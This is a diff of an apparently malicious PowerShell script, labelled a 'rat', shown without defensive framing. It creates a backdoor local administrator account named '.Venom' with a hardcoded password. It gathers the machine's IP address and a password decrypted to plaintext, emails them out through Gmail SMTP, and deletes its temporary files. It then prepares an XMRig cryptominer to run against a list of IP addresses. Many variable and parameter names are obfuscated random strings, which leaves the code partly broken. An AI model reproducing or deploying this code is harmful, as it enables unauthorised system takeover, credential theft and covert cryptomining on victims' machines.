@@ -9,8 +9,8 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 } else {
     # Create a new local admin account
     $username = ".Venom"
-    $oSUlZHBnGEmF = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
-    New-LocalUser $username -oSUlZHBnGEmF $oSUlZHBnGEmF -FullName ".Venom" -Description "Local admin account created via PowerShell"
+    $Password = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
+    New-LocalUser $username -Password $Password -FullName ".Venom" -Description "Local admin account created via PowerShell"
     Add-LocalGroupMember -Group "Administrators" -Member $username
 }
 
@@ -21,9 +21,9 @@ $rhZepgLQaCHN = Get-Location
 $YWNqxtueVmln = Get-Content PkUbTvqXFIdB.txt
 $bEISMDZaYLdl = Get-Content NzKnmxLrbsBw.txt
 
-$ULOHTnPiZmVQ = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).ULOHTnPiZmVQ
+$InterfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias
 
-$IP = (Get-NetIPAddress -AddressFamily IPv4 -ULOHTnPiZmVQ $ULOHTnPiZmVQ).IPAddress
+$IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress >> ip.txt
 
 $CnoDdShspyQB = "$env:temp/$VwSntuJIlMmo"
 $KekiPVsfUNLB = "$env:UserName.rat"
@@ -31,12 +31,12 @@ $KekiPVsfUNLB = "$env:UserName.rat"
 Set-Content -CnoDdShspyQB $KekiPVsfUNLB -Value ""
 
 Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $IP
-Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $oSUlZHBnGEmF
+Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $Password
 Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $CnoDdShspyQB
 
-$oSUlZHBnGEmF = ConvertTo-SecureString $bEISMDZaYLdl -AsPlainText -Force
-$plainoSUlZHBnGEmF = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($oSUlZHBnGEmF))
-Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $plainoSUlZHBnGEmF
+$Password = ConvertTo-SecureString $bEISMDZaYLdl -AsPlainText -Force
+$plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password))
+Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $plainPassword
 
 Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $CnoDdShspyQB
 
@@ -48,9 +48,12 @@ Send-MailMessage `
     -SmtpServer "smtp.gmail.com" `
     -Port 587 `
     -UseSsl `
-    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $YWNqxtueVmln, (ConvertTo-SecureString -String $plainoSUlZHBnGEmF -AsPlainText -Force))
+    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $YWNqxtueVmln, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))
+
+copy $rhZepgLQaCHN\ip.txt $CnoDdShspyQB
 
 Remove-Item $KekiPVsfUNLB
+Remove-Item ip.txt
 
 mkdir $CnoDdShspyQB
 cd $CnoDdShspyQB
@@ -99,7 +102,7 @@ if (Test-CnoDdShspyQB -CnoDdShspyQB $newConfigCnoDdShspyQB) {
 }
 
 # Define the CnoDdShspyQB to the text file with IP addresses
-#$ipFile = "$CnoDdShspyQB\Ips.txt"
+$ipFile = "$CnoDdShspyQB\ip.txt"
 
 # Define the CnoDdShspyQB to XMRig executable
 $xmrCnoDdShspyQB = "$DCtviRxcUnEV\xmrig.exe"
@@ -120,9 +123,9 @@ Send-MailMessage `
 
 # Read the IP addresses from the text file
 
-#$ips = Get-Content -CnoDdShspyQB $ipFile
+$ips = Get-Content -CnoDdShspyQB $ipFile
 
-for ($ip in $IP) {
+for ($ip in $ips) {
     try {
         Write-Output "Processing IP: $ip"
         
